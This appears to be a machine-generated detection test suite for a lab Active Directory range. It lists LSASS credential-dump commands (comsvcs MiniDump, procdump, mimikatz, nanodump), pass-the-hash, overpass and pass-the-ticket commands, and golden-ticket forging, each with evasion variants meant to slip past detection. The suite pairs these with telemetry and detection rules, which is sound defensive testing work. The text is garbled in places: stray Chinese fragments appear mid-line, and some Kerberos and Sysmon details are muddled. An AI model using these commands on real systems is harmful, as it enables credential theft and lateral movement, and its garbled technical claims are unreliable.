# mimo-v2.6-flash — postex-win
# SOURCE: upstream-2 (mimo-v2.6-pro), benchmark frame + lab details, streaming

# Windows Post-Exploitation Detection Test Suite — VendorLab Range

**Scope:** internal validation material. All targets are the vendor lab (10.99.0.5 `corp.vendorlab.test`, 10.99.1.0/24 workstations, 10.99.2.0/24 Linux jump box). Expected verdict for every base case and every evasion variant: **DETECT or BLOCK**. An evasion that slips through is a **regression failure (P1)** against the detection, not an accepted gap.

**Pre-staged artifacts (validation team prepares before run):**
- `C:\Tools\mimikatz.exe`, `C:\Tools\procdump.exe` (Sysinternals), `C:\Tools\nanodump.exe`, `C:\Tools\Rubeus.exe` on `WKS-01` (10.99.1.10)
- Impacket suite on Linux box `10.99.2.10` (`crackmapexec`, `wmiexec.py`, `getTGT.py`, `secretsdump.py`)
- Baseline NTLM for `t1-admin`: obtain with `secretsdump.py corp.vendorlab.test/t1-admin:LabPass123!@10.99.0.5` → record `NTHASH` into variable `%ADMNTHASH%` before running cases.

**Baseline log stance (both DC and workstations):** Sysmon config `S-Conf-Lab.xml` mapped to MITRE + Sigma `windows-sysmon`. EDR sensor in audit (telemetry) mode so both verdict streams are captured. WMI-Activity, WinRM, PowerShell (4103/4104), Kerberos, Security log sizes raised to 512 MB pre-run.

---

## TC-LSASS — LSASS credential-dump methods, ranked by detectability

### TC-LSASS-01 — comsvcs MiniDump via rundll32 (Tier 1, loudest)

```text
ATT&CK  T1003.001 OS Credential Dumping: LSASS Memory
WSTG    n/a (host-side; feeds WSTG-ATHN / ATT&CK coverage matrix)

run on: WKS-01 (10.99.1.10), context: t1-user01 (needs admin for full dump;
        run elevated for the real test, non-elevated for the access-denied
        negative case)

BASE:
  for /f "tokens=2 delims=," %i in ('tasklist /fi "imagename eq lsass.exe" /fo
    csv /nh') do set LSPID=%i
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %LSPID%
    C:\Windows\Temp\lsass.dmp full

EVASION (all must regress-fail):
  E1  renamed/off-path DLL:
        copy C:\Windows\System32\comsvcs.dll C:\Users\Public\x.dll
        rundll32.exe C:\Users\Public\x.dll, MiniDump %LSPID% C:\Users\Public\d.bin full
  E2  case + whitespace variant, no "full" arg:
        rundll32.exe C:\WINDOWS\system32\COMSVCS.dll,  MiniDump  %LSPID%  C:\Users\Public\d.dmp
  E3  no-cmd launcher (Base64, PS):
        powershell -w hidden -enc <BASE64 of "rundll32 comsvcs.dll, MiniDump ...">
  E4  indirect process parent (Word-like start breaks parent-chain rules):
        wmiprvse → not applicable; use explorer-spawnedProjected:
        cmd /c "set a=comsvcs&& set b=.dll&& rundll32 C:\Windows\System32\%a%%b%, MiniDump ..."

EXPECTED TELEMETRY (BASE + E1–E4):
  EID 1  Sysmon  rundll32.exe (or PS) command line contains "MiniDump" token
         (strip path/case first — this is what E1/E2 break)
  EID 1  Sysmon  comsvcs.dll loaded by a non-comsvcs host (rundll32.exe outside
         dllhost/svchost lineage)  → covers E1 (hash/rename-proof)
  EID 10 Sysmon  TargetImage = lsass.exe, GrantedAccess = 0x1410/0x1010/0x1fffff
  EID 11 Sysmon  file create C:\...\*.dmp (bin path in user-writable dir)
  Sec 4656/4663 (if object access auditing on lsass) + EDR hook on
       MiniDumpWriteDump / OpenProcess(lsass)

DETECTION RULE (concrete):
  Trigger A (primary, evasion-proof): Sysmon EID 1 → parent in
      {rundll32.exe, powershell.exe} AND module-load EID 7 of
      comsvcs.dll by rundll32 (hash match, any name/path).
  Trigger B: EID 10 access mask 0x1410/0x1010/0x1fffff on lsass.exe from
      any image that is not in the approved EDR/AV lineage.
  Trigger C: EID 11 *.dmp write + caller process = MiniDump export caller.

REGRESSION CRITERIA: E1 must fire on module hash or EID-10 mask alone;
  E2 must not depend on the literal string "comsvcs.dll MiniDump ... full";
  E3 must fire on decoded command hash (AMSI) + EID 10; E4 must fire on
  Trigger B/C independent of parent chain. Any silent success = P1 regression.
```

### TC-LSASS-02 — procdump -ma lsass (Tier 2, canonical, low-noise signature)

```text
BASE (elevated on WKS-01):
  procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\ls.dmp

EVASION:
  E1  procdump renamed: copy procdump.exe C:\Users\Public\spoolmon.exe
        spoolmon.exe -accepteula -ma lsass.exe d.dmp
  E2  dump by PID with mask trick: procdump -ma <PID> out.dmp  (no lsass literal)
  E3  Sysinternals suite launch via LiveKd? (scope guard) — skip, not needed

EXPECTED TELEMETRY:
  EID 1  command line -ma + lsass literal (E1 breaks literal; E2 has none)
  EID 10 TargetImage lsass.exe, GrantedAccess 0x1fffff from procdump/spoolmon
  EID 11 *.dmp create; (SHA256 rename-proof via EID 7 module/image load)
DETECTION RULE: EID 10 mask + EID 11 dump write correlation (60 s window),
  with TS<->name allow-list for in-house EDR binaries only.
REGRESSION: renamed binary (E1) must still fire on EID 10 + image-hash
  reputation tag from EID 7 -- if rule keys only "procdump.exe" string, P1.
```

### TC-LSASS-03 — mimikatz sekurlsa::logonpasswords (Tier 2, direct OpenProcess)

```text
BASE (elevated):
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

EVASION:
  E1  sekurlsa::logonpasswords renamed command file:
        echo sekurlsa::logonpasswords ^& exit > C:\Users\Public\x.txt
        mimikatz.exe "privilege::debug" "sekolrussa::logonpasswords"  (typo decoy)
        — skip typo decoy; real evader runs: mimikatz.exe "" "sekurlsa::logonpasswords" "exit"
        with no privilege::debug (uses existing token)
  E2  mimikatz renamed + commands from stdin:
        type C:\Users\Public\x.txt | C:\Users\Public\katz.exe

EXPECTED TELEMETRY:
  EID 1  image name / hash mimikatz, "privilege::debug" token (E1/E2 break strings)
  EID 10 lsass access 0x1fffff / 0x1010 (mimikatz uses 0x1010 for read)
  Sec 4673 privileged service call (SeDebugPrivilege enabled), 4656 on lsass
  EDR hook: OpenProcess + secsysmodule-load
DETECTION RULE: EID 10 lsass 0x1xxx from non-system binary with SeDebug
  assert within 30 s (Sec 4673/4674) → fire regardless of image name.
REGRESSION: renamed mimikatz from stdin (E2) must fire via correlate rule;
  literal-string "mimikatz" rules are FAIL on E2.
```

### TC-LSASS-04 — LSASS handle theft / DuplicateHandle (Tier 3, near-silent)

```text
ATT&CK  T1003.001 + T1106 (native API abuse)

Concept: no new OpenProcess(lsass). Duplicated existing handle from a
  handle-owning process (typically svchost/winlogon or the EDR itself).

BASE (elevated,纳米实现 uses nanodump --dup):
  nanodump.exe --dup --write C:\Windows\Temp\dup.dmp
  (alternate: nanodump --dup 0x1410 --dup-handle <PID> <H>)

EVASION (must regress-fail):
  E1  non-write variant: nanodump --dup --fork  (PssCaptureSnapshot fork)
  E2  dump exfil-free: nanodump --dup base64dump (stdout, no .dmp file)
  E3  custom your-own-handle via霉 DuplicateHandle BOF (installed beacon
      task "steal-handle"): after dump, close handle — no persistent artifact.

EXPECTED TELEMETRY:
  EID 10 (does NOT reliably fire for pure DuplicateHandle — this is the
      detection gap; regression case proves telemetry depth):
    - Sysmon EID 10 ProcessAccess on lsass.exe is typically EMPTY
    - EID 7 module load: nanodump exports NtQuerySystemInformation
        → pattern: query SystemHandleInformation (0x10) by non-system process
  Sec 4656/4663 on the *handle-owning source process* (OpenProcess with
      PROCESS_DUP_HANDLE, mask 0x40) from unusual image
  EDR hook on DuplicateHandle with目标 unknown target process + source
      =_SYSTEM-owned
  MalSecLogon-style detection: the dump target event — Sysmon EID 11
        for .dmp (skip with E2, so use EID 7/4656 as primary)

DETECTION RULE (this is the hard one — product must catch without EID 10):
  R1: EID 1 nanodump.exe (hash + export SHA) — trivial
  R2 (real rule): EID 7 shows module "ntdll" with NtQuerySystemInformation
      called with SystemHandleInformation (EDR hook event), followed within
      5 s by OpenProcess(0x40 PROCESS_DUP_HANDLE) on系统-owned svchost or
      any handle-owning process, followed by ReadProcessMemory / dump-write
      on a process the calling PID never opened → fire as LSASS handle theft.
  R3: EID 11 *.dmp with absent EID 10 on lsass → anomaly flag "dump w/o
      access event = handle theft suspect" (catches E1+file variant).

REGRESSION CRITERIA:
  E1 (--fork) must fire via R2/R3; --fork variant removes the .dmp write,
      so rule must catch snapshot+read pattern: PssCaptureSnapshot hook on
      lsass PID from non-EDR binary → BLOCK.
  E2 (base64 stdout, no file) must fire on R2 only — pure EID-11 rules FAIL.
  E3 (custom DuplicateHandle BOF) must fire on hook-level R2 telemetry;
      if the product sigs only nanodump binary name → P1, evader wins with
      30 lines of C.
```

### LSASS ranking summary (detectability, best→worst)

```text
1. TC-LSASS-01 comsvcs MiniDump    EID1+EID10+EID11 triple signal, LOLBIN
2. TC-LSASS-02 procdump -ma        EID10+EID11, signature-known binary
3. TC-LSASS-03 mimikatz            EID10, string+hash+4103 (EncodedCommand)
4. TC-LSASS-04 handle theft (dup)  EID10 absent → needs API-level telemetry;
                                     lowest detectability = highest weight
                                     in the regression suite
```

---

## TC-PTH — pass-the-hash

### TC-PTH-01 — endpoint PtH (mimikatz sekurlsa::pth)

```text
run on: WKS-01 with t1-user01 (dumped hash injected locally)

BASE:
  mimikatz.exe "privilege::debug" "sekurlsa::pth /user:t1-admin
    /domain:corp.vendorlab.test /ntlm:%ADMNTHASH% /run:cmd.exe" exit

VALIDATION STEP (the actual detectable action):
  in spawned cmd: dir \\DC01\c$

EXPECTED TELEMETRY:
  DC  Sec 4624 Type 3 Logon, AuthenticationPackageName = NTLM,
        LogonProcessName = NtLmSsp , TargetUserName = t1-admin
        (no 4624 on WKS-01; 4648/6808 analog on the local box only if
        explicit-creds used)
  DC  no 4768/4769 Kerberos events despite成功 c$ access → strong
        "NTLM elevated use" anomaly
  EID 3 Sysmon (WKS-01) 445 to 10.99.0.5
  EID 1 Sysmon  cmd.exe spawned by mimikatz.exe (parent anomaly)

DETECTION RULE:
  A: DC 4624 (Type 3, NTLM, user in Tier-0/t1-admin group) + no matching
     4768 within ±2 min → PTH嫌疑 BLOCK on 445 from非域成员主机
  B: EID 3 445 to DC from IP in 10.99.1.0/24 + user -- workstation-local
      logon map mismatch
  C: EID 1 parent=mimikatz → immediate (ties to TC-LSASS-03)

EVASION (must regress-fail):
  E1  elevated target via runas /netonly:
        runas /user:corp.vendorlab.test\t1-admin /netonly cmd.exe
        → then dir \\DC01\c$ with plaintext (covers plaintext→NTLM path;
          this is 4624 Type 3 with explicit creds — rule A must still fire
          but NOT confuse with runas of legit admin tooling on jump box)
  E2  from Linux 10.99.2.10:
        wmiexec.py -hashes :%ADMNTHASH% corp.vendorlab.test/t1-admin@10.99.0.5
  E3  pass-the-key AES256 (overpass-the-hash via Rubeus):
        Rubeus.exe asktgt /user:t1-admin /aes256:%AESKEY% /dc:DC01
          /ptt /nowrap
        → then dir \\DC01\c$  (no NTLM at all)
  E4  RC4 overpass: Rubeus asktgt /user:t1-admin /rc4:%ADMNTHASH% /ptt

REGRESSION CRITERIA:
  E2: source = 10.99.2.10 (corporate Linux, not a domain host) — rule must
      flag 4624 NTLM Type 3 + source not in domain-computer IP inventory.
  E3: 4768 issued with EncryptionType 0x12 (AES) for t1-admin — normal-ish,
      BUT followed by 4624 Type 3/NetworkInteractive? PtK with implicit
      logon shows 4624 Type 3 Kerberos? For PtT: no re-logon at all,
      4624 absent; rule must instead flag `Rubeus asktgt` pattern via EID 1
      + EID 3 (SMB from non-Windows) + Kerberos 4768 RC4 0x17 for E4.
  E4 specifically: 4768 TicketOptions 0x40800010 / encryption 0x17 from
      a workstation for a Tier-0 account = classic overpass signature.
  If rule only catches mimikatz literal or NTLM-only → E3 slides = P1.
```

### TC-PTH-02 — pass-the-ticket (forged/stolen kirbi)

```text
BASE (on WKS-01; ticket harvested beforehand via
        secretsdump / Rubeus dump on DC session):
  Rubeus.exe ptt /ticket:doIF<...base64...>
  klist
  dir \\DC01\c$

EVASION:
  E1  mimikatz kerberos::ptt doIF...   (diff parent; same network effect)
  E2  inject via WTS API (Rubeus ptt /wts /id:2 -- session-target注入)
        — targets session 2's logon session, no visible klist in current
        session until access
  E3  diamond/sapphire ticket (forged with full PAC, no TGT request from DC):
        kerberos::golden /user:t1-admin /domain:corp.vendorlab.test
          /sid:S-1-5-21-... /krbtgt:<hash> /ticket:diag.kirbi /enctype:aes256
          → ptT. NO 4768 from the DC AT ALL (no TGT-REQ anomaly).

EXPECTED TELEMETRY:
  DC  4768 (missing for E3), 4769 Service Ticket Request with
        unusual TicketEncryptionType (0x17 for forged RC4)
        Encryption 0x12/0x13 with pre-auth type 0 (no PA-ENC-TIMESTAMP
        = service ticket presented w/o prior TGT) for forged
  DC  4769 with TicketOptions / LogonProcessName discrepancies
  WKS EID 1 Rubeus/mimikatz command line ptT token
  WKS EID 3 445/88 traffic to DC; port 88 from process that never did
        AS-REQ (no 4768 on DC) — request ticket hash mismatch

DETECTION RULE:
  A: DC-side correlation — any 4769 with Encryption 0x17 (RC4) for
     Tier-0 user + client IP in 10.99.1.0/24 (AES-domain default) → BLOCK
  B: for E3 diamond — no 4768 precedes 4769 with pre-auth-type
